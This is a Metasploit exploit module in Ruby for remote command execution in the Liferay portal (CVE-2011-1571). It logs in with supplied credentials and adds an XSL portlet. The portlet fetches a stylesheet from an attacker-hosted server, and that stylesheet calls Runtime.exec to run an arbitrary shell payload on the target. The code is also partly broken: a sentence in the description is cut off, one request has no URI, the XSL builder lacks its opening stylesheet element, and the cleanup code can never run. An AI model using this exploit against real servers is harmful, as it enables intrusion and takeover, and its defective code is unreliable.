# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require &#039;msf/core&#039;
require &#039;active_support/json&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Liferay XSL Command Execution&#039;,
      &#039;Description&#039;    => %q{
      This module exploits a vulnerability in the XSL parser of the
      can be executed via java calls in the data fed to the Xalan
      XSLT processor. If XSLPAGE is defined, the user must have rights
      to change the content of that page (to add a new XSL portlet),
      otherwise it can be left blank and a new one will be created.
      The second method however, requires administrative privileges.
      },
      &#039;Author&#039;  => 
        [
          # SecureState R&I Team - Special Thanks To Jake Garlie, Chris Murrey
          &#039;Spencer McIntyre&#039;,
          &#039;SecureState R&I Team&#039;,  # SecureState Research and Innovation Team
          &#039;Nicolas Gregoire&#039;,  # authored the vulnerability details provided in the wiki
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Version&#039;        => &#039;$Revision: $&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2011-1571&#039; ],
          [ &#039;URL&#039;, &#039;http://xhe.myxwiki.org/xwiki/bin/view/XSLT/Application_Liferay&#039; ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;    => [ &#039;win&#039;, &#039;linux&#039;, &#039;unix&#039; ],
      &#039;Stance&#039;      => Msf::Exploit::Stance::Aggressive,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
            }
        },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;,            { &#039;groupid&#039; => 0,  &#039;pauth&#039; => false } ],
          [ &#039;Liferay 5.2.3 (Tomcat/JBoss)&#039;,  { &#039;groupid&#039; => 16,   &#039;pauth&#039; => false } ],
          [ &#039;Liferay 6.0.0 (Tomcat/JBoss)&#039;,  { &#039;groupid&#039; => 18,   &#039;pauth&#039; => false } ],
          [ &#039;Liferay 6.0.1-6 (Tomcat/JBoss)&#039;,  { &#039;groupid&#039; => 18,   &#039;pauth&#039; => true  } ],
        ],
      &#039;DisclosureDate&#039; => &#039;January 12, 2011&#039;, # Liferay portal issue # 14726
      &#039;DefaultTarget&#039;  => 0))
    
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;, ]),
        OptString.new(&#039;XSLPAGE&#039;,  [ false, &#039;Full path to the page to add an XSL portlet to, (default: random)&#039;, nil ]),
        OptString.new(&#039;PATH&#039;,     [ true,  &#039;The URI path of the portal&#039;, &#039;/&#039; ]),
      ], self.class)
  end
  
  def auto_target(headers)
    print_status("Attempting to automatically select a target...")
    case headers[&#039;liferay-portal&#039;]
    when /5.2.3/
      return targets[1]
    when /6.0.0/
      return targets[2]
    when /6.0.[1-6]/
      return targets[3]
    end
    return nil
  end

  def exploit
    print_status(&#039;Logging in and creating a page to embed XSL Content into...&#039;)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;web/guest/home&#039;
    })
    
    mytarget = target
    if (target.name =~ /Automatic/)
      mytarget = auto_target(res.headers)
      if (not mytarget)
        raise RuntimeError, "Unable to automatically select a target"
      end
      print_status("Automatically selected target \"#{mytarget.name}\"")
    else
      print_status("Using manually select target \"#{mytarget.name}\"")
    end
    sessionid = &#039;JSESSIONID=&#039; << res.headers[&#039;set-cookie&#039;].split(&#039;JSESSIONID=&#039;)[1].split(&#039;; &#039;)[0]
    cookie = "#{sessionid}; COOKIE_SUPPORT=true"
    
    app_base = rand_text_alphanumeric(8+rand(8))
    new_page = datastore[&#039;XSLPAGE&#039;] || rand_text_alphanumeric(8+rand(8))
    malicious_url = "http://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{app_base}"
    @xsl_data = run_cmd_with_xsl(payload.encoded)  # this is really the data returned for XSL and XML requests
    service_url = &#039;http://&#039; + datastore[&#039;SRVHOST&#039;] + &#039;:&#039; + datastore[&#039;SRVPORT&#039;] + resource_uri
    print_status("Starting up our web service on #{service_url} ...")
    start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req, &#039;XSL&#039;)
        },
        &#039;Path&#039; => &#039;/&#039; + app_base + &#039;.xsl&#039;
    }})
    start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req, &#039;XML&#039;)
        },
        &#039;Path&#039; => &#039;/&#039; + app_base + &#039;.xml&#039;
    }})
    
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;web/guest/home?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=1&saveLastPath=0&_58_struts_action=%2Flogin%2Flogin&#039;,
      &#039;data&#039;      => "_58_redirect=&_58_rememberMe=false&_58_login=#{Rex::Text.uri_encode(datastore[&#039;USERNAME&#039;], &#039;hex-normal&#039;)}&_58_password=#{Rex::Text.uri_encode(datastore[&#039;PASSWORD&#039;], &#039;hex-normal&#039;)}",
      &#039;cookie&#039;    => cookie
    })
    
    if res.code != 302
      print_error(&#039;Login failed.&#039;)
      return
    end
    
    cookie = &#039;&#039;
    for cookie_i in [ &#039;JSESSIONID=&#039;, &#039;LOGIN=&#039;, &#039;SCREEN_NAME=&#039;, &#039;COMPANY_ID=&#039;, &#039;ID=&#039;, &#039;PASSWORD=&#039;, &#039;REMEMBER_ME=&#039; ]
      cookie << cookie_i + res.headers[&#039;set-cookie&#039;].split(cookie_i)[1].split(&#039;; &#039;)[0] + &#039;; &#039;
    end
    xml_http_request_headers = { &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039; }

    if datastore[&#039;XSLPAGE&#039;] == nil  # the page was not defined, so we try to create a new one
      res = send_request_cgi({
        &#039;method&#039;     => &#039;POST&#039;,
        &#039;uri&#039;        => datastore[&#039;PATH&#039;] + &#039;c/layout_management/update_page&#039;,
        &#039;data&#039;       => "mainPath=%2Fc&doAsUserId=&cmd=add&groupId=#{mytarget[&#039;groupid&#039;]}&privateLayout=false&parentLayoutId=0&name=#{new_page}",
        &#039;cookie&#039;     => cookie,
        &#039;headers&#039;    => xml_http_request_headers,
      })
      if res.code != 200 or res.body == ""
        print_error(&#039;Could not create a new page to embed the XSL Content into...&#039;)
        return
      end
      new_page = datastore[&#039;PATH&#039;] + &#039;web/guest/&#039; + URI.parse(ActiveSupport::JSON.decode(res.body)[&#039;url&#039;]).path.split(&#039;/&#039;)[-1] # could possible be different and have a number at the end
      print_status("Successfully created page #{new_page}, now configuring XSL...")
    else
      new_page = datastore[&#039;PATH&#039;] + &#039;web/guest/&#039; + datastore[&#039;XSLPAGE&#039;]
    end
    
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => new_page,
      &#039;cookie&#039;    => cookie
    })
    
    plid = /getPlid:function\(\)\{return"[\d]{3,7}"}/i.match(res.body)[0][26..-3].to_i
    layoutid = /getLayoutId:function\(\)\{return\"[\d]{1,5}\"\}/i.match(res.body)[0][30..-3].to_i
    if mytarget[&#039;pauth&#039;]
      pauth = &#039;p_auth=&#039; + /\?p_auth=[a-zA-Z0-9]{3,12}&/i.match(res.body)[0][8..-6] + &#039;&&#039;
    else
      pauth = &#039;&#039; # versions prior to 6.0.1 do not require a p_auth token
    end
    
    res = send_request_cgi({
      &#039;method&#039;     => &#039;POST&#039;,
      &#039;uri&#039;        => datastore[&#039;PATH&#039;] + &#039;c/portal/update_layout&#039;,
      &#039;data&#039;       => "p_l_id=#{plid}&p_p_id=102&p_p_col_id=column-1&p_p_col_pos=0&doAsUserId=&dataType=json&cmd=add&currentURL=#{Rex::Text.uri_encode(new_page, &#039;hex-normal&#039;)}",
      &#039;cookie&#039;     => cookie,
      &#039;headers&#039;    => xml_http_request_headers,
    })
    if res.code != 200
      print_error(&#039;Could not create a new page to embed the XSL Content into...&#039;)
      return
    end
    
    portletid = /p_p_id_[\d]{1,4}_INSTANCE_[a-zA-Z0-9]{2,5}/i.match(res.body)[0][7..-1]
    
    res = send_request_cgi({
      &#039;method&#039;     => &#039;POST&#039;,
      &#039;data&#039;       => "_86_cmd=update&_86_xmlURL=#{Rex::Text.uri_encode(malicious_url, &#039;hex-normal&#039;)}.xml&_86_xslURL=#{Rex::Text.uri_encode(malicious_url, &#039;hex-normal&#039;)}.xsl",
      &#039;cookie&#039;     => cookie,
    })
    
    if res.code != 200
      print_error(&#039;Could not configure the XSL Portlet&#039;)
      return
    end
    
    print_status("Successfully configured XSL Portlet, requesting page to execute code...")
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => new_page,
      &#039;cookie&#039;    => cookie
    })
    
    # wait for the data to be sent
    waited = 0
    while (not @xsl_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > 30)
        raise RuntimeError, &#039;Server did not request XSL data -- Maybe it cant connect back to us?&#039;
      end
    end
    
    print_status("Shutting down the web service...")
    stop_service
    return
    
    res = send_request_cgi({
      &#039;method&#039;     => &#039;POST&#039;,
      &#039;uri&#039;        => datastore[&#039;PATH&#039;] + &#039;c/portal/update_layout&#039;,
      &#039;cookie&#039;     => cookie,
      &#039;data&#039;       => "p_l_id=#{plid}&p_p_id=#{portletid}&doAsUserId=&cmd=delete"
    })
    
    if datastore[&#039;XSLPAGE&#039;] == nil  # we created the page, so delete it
      res = send_request_cgi({
        &#039;method&#039;     => &#039;POST&#039;,
        &#039;uri&#039;        => datastore[&#039;PATH&#039;] + &#039;c/layout_management/update_page&#039;,
        &#039;data&#039;       => "doAsUserId=&cmd=delete&groupId=#{mytarget[&#039;groupid&#039;]}&privateLayout=false&layoutId=#{layoutid}",
        &#039;cookie&#039;     => cookie,
        &#039;headers&#039;    => xml_http_request_headers,
      })
    end
  end
  
  # Handle incoming requests from the server
  def on_request_uri(cli, request, resource)
    print_status("Sending the #{resource} File to the server...")
    send_response(cli, @xsl_data)
    @xsl_sent = true
  end
  
  def run_cmd_with_xsl(cmd)
    varpayload = rand_text_alpha(10+rand(8))
    varruntime = rand_text_alpha(10+rand(8))
    varproc = rand_text_alpha(10+rand(8))
    payload << " <xsl:template match=\"/\">\n"
    payload << "  <xsl:variable name=\"#{varruntime}\" select=\"jv:java.lang.Runtime.getRuntime()\"/>\n"
    payload << "  <xsl:variable name=\"osversion\" select=\"jv:java.lang.System.getProperty(&#039;os.name&#039;)\"/>\n"
    payload << "  <xsl:variable name=\"osversion\" select=\"jv:toLowerCase($osversion)\"/>\n\n"
    
    payload << "  <xsl:choose>\n"
    payload << "   <xsl:when test=\"contains($osversion,&#039;windows&#039;)\">\n"
    payload << "    <xsl:variable name=\"#{varpayload}\"><![CDATA[#{cmd}]]></xsl:variable>\n"
    payload << "    <xsl:variable name=\"#{varproc}\" select=\"jv:exec($#{varruntime}, $#{varpayload})\"/>\n"
    payload << "   </xsl:when>\n\n"
    
    payload << "   <xsl:otherwise>\n"
    payload << "    <xsl:variable name=\"#{varpayload}\"><![CDATA[/bin/sh ==== -c ==== #{cmd}]]></xsl:variable>\n"
    payload << "    <xsl:variable name=\"#{varpayload}\" select=\"jv:split($#{varpayload}, &#039; ==== &#039;)\"/>\n"
    payload << "    <xsl:variable name=\"#{varproc}\" select=\"jv:exec($#{varruntime}, $#{varpayload})\"/>\n"
    payload << "   </xsl:otherwise>\n"
    payload << "  </xsl:choose>\n\n"
    
    payload << " </xsl:template>\n"
    payload << "</xsl:stylesheet>\n"
    payload
  end
end



